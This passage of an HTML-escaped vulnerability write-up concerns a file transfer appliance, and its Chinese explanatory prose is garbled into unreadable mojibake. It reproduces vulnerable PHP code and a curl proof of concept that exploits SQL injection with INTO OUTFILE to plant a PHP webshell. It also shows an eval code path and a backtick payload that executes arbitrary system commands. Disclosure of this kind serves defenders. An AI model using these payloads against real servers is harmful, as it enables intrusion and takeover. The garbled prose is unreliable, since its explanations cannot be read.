        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;c_manager = \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;manager&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_name LIKE \&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;client_name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%%&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$where_clause&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;t_mail_server.c_user_id LIKE \&apos;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_properties( ... )&lt;/code&gt; ä¸­æœƒå°‡æ‰€å‚³é€²çš„åƒæ•¸é€²è¡Œ SQL èªå¥çš„æ‹¼è£ï¼Œè€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; ç‚ºæœ€é—œéµçš„ä¸€å€‹å‡½æ•¸ã€‚
åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;construct_where_clause( ... )&lt;/code&gt; ä¸­å¯ä»¥çœ‹åˆ°åƒæ•¸çš†ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_real_escape_string&lt;/code&gt; ä¾†é˜²ç¦¦ä½†å”¯ç¨ç¼ºå°‘ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$client_id&lt;/code&gt;ï¼Œå¾åŸå§‹ç¢¼çš„ Coding Style è§€å¯ŸçŒœæ¸¬æ‡‰è©²æ˜¯é–‹ç™¼æ™‚çš„ç–å¿½ï¼Œå› æ­¤æ ¹æ“šç¨‹å¼æµç¨‹é€å‡ºå°æ‡‰çš„åƒæ•¸å³å¯è§¸ç™¼ SQL Injectionã€‚&lt;/p&gt;

&lt;p&gt;æ­¤å¤–ï¼Œåœ¨ FTA ä¸­è³‡æ–™åº«ä½¿ç”¨è€…ç‚º root å…·æœ‰ FILE_PRIV æ¬Šé™ï¼Œå› æ­¤å¯ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INTO OUTFILE&lt;/code&gt; æ’°å¯«è‡ªå·± PHP ä»£ç¢¼è‡³å¯å¯«ç›®éŒ„é”æˆé ç«¯ä»£ç¢¼åŸ·è¡Œï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://&amp;lt;fta&amp;gt;/courier/1000@/security_key2.api &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;aid=1000&amp;amp;user_id=1&amp;amp;password=1&amp;amp;client_id=&apos; OR 1=1 LIMIT 1 INTO OUTFILE &apos;/home/seos/courier/themes/templates/.cc.php&apos; LINES TERMINATED BY 0x3c3f...#&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ç”Ÿæˆçš„ PHP æª”æ¡ˆä½ç½®åœ¨&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://&amp;lt;fta&amp;gt;/courier/themes/templates/.cc.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;known-secret-key-leads-to-remote-code-execution&quot;&gt;Known Secret-Key leads to Remote Code Execution&lt;/h4&gt;

&lt;p&gt;åœ¨å‰å€‹å¼±é»ä¸­ï¼Œè¦é”æˆé ç«¯ä»£ç¢¼åŸ·è¡Œé‚„æœ‰ä¸€å€‹æ¢ä»¶æ˜¯è¦å­˜åœ¨å¯å¯«ç›®éŒ„ï¼Œä½†ç¾å¯¦ä¸­æœ‰æ©Ÿç‡æ‰¾ä¸åˆ°å¯å¯«çš„ç›®éŒ„æ”¾ç½® Webshellï¼Œå› æ­¤ç„¡æ³•å¾ SQL Injection é”æˆä»£ç¢¼åŸ·è¡Œï¼Œä¸éé€™æ™‚æœ‰å¦å¤–ä¸€æ¢è·¯å¯ä»¥å¹«åŠ©æˆ‘å€‘é”æˆé ç«¯ä»£ç¢¼åŸ·è¡Œã€‚&lt;/p&gt;

&lt;p&gt;é€™å€‹å¼±é»çš„å‰ææ¢ä»¶æ˜¯ &lt;strong&gt;å·²çŸ¥è³‡æ–™åº«ä¸­æ‰€å­˜çš„åŠ å¯† KEY&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;é€™é»å°æˆ‘å€‘ä¾†èªªä¸æ˜¯å•é¡Œï¼Œå¾å‰é¢çš„ SQL Injection å¼±é»å¯ä»»æ„è®€å–è³‡æ–™åº«å…§å®¹ï¼Œå¦å¤–é›–ç„¶åœ¨ç¨‹å¼ç¢¼ä¸­æœ‰å°åƒæ•¸é€²è¡Œä¸€äº›éæ¿¾ï¼Œä½†é‚£äº›éæ¿¾æ˜¯å¯ä»¥ç¹éçš„ï¼&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;/home/seos/courier/sfUtils.api&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;fc&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/(.+)\(.*\)/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_session_cache&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;delete_user_contact&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;valid_password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_update_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_password_format_disallowed&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_email_verified&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_exist_allow_direct_download&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;user_profile_auth&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cs_method&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$orig_func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;get_user_contact_list&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/[\\\/&quot;\*\:\?\&amp;lt;\&amp;gt;\|&amp;amp;]/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(count(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_csinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;user_id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, array(&quot;nickname&quot;=&amp;gt;&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;))));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\\&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;\\$&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;addslashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p_no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;echo(&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(&quot;&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;, &quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_param&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&quot;));&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$func_call&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å¦‚æœå·²çŸ¥åŠ å¯† KEY çš„è©±ï¼Œå³å¯æ§åˆ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decrypt( $_POST[fc] )&lt;/code&gt; çš„è¼¸å‡ºï¼Œè€Œå¾Œé¢çš„æ­£è¦è¡¨ç¤ºå¼é›–ç„¶é‡å°å‡½æ•¸åç¨±é€²è¡Œç™½åå–®éæ¿¾ï¼Œä½†æ˜¯æ²’å°åƒæ•¸é€²è¡Œéæ¿¾ï¼Œå¦‚æ­¤ä¸€ä¾†æˆ‘å€‘å¯ä»¥åœ¨åƒæ•¸çš„éƒ¨åˆ†æ’å…¥ä»»æ„ä»£ç¢¼ï¼Œå”¯ä¸€çš„æ¢ä»¶å°±æ˜¯ä¸èƒ½æœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;)&lt;/code&gt; å‡ºç¾ï¼Œä½†ç”±æ–¼ PHP çš„é¬†æ•£ç‰¹æ€§ï¼Œç©æ³•å…¶å¯¦å¾ˆå¤šï¼Œé€™è£¡åˆ—èˆ‰å…©å€‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
ç›´æ¥é€éåå¼•è™ŸåŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼š&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;user_profile_auth(`$_POST[cmd]`);&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;
